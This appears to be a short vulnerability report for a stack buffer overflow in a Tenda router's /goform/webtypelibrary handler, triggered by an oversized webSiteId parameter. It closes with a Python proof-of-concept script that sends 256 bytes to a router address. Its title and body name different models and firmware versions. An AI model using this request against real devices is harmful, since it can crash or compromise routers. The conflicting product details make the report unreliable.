# Bug Report: Buffer Overflow in Tenda FH1201 V1.2.0.14(408) Router
A buffer overflow vulnerability has been identified in the Tenda FH1206 1.2.0.8(8155) router firmware that allows remote attackers to potentially execute arbitrary code or cause denial of service through malformed HTTP requests.

## Vulnerability Details

### Product Information
- **Product**: Tenda FH1206 Wireless Router
- **Affected Version**: 1.2.0.8(8155)
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
The vulnerable code path processes HTTP requests to the `/goform/webtypelibrary`. When `webSiteId` is specified with excessive data, the buffer overflow occurs during `strcat`.
![alt text](image.png)
## poc
![alt text](image-1.png)
## Reproduce
```python
#!/usr/bin/env python3
from pwn import *
import requests

def send_payload(url, payload):
    print("sending...")
    response = requests.get(url, params={'webSiteId': payload})
    print(f"Response status code: {response.status_code}\nResponse body: {response.text}")

payload = 0x100 * b'1'

send_payload("http://10.10.10.1/goform/webtypelibrary", payload)
```
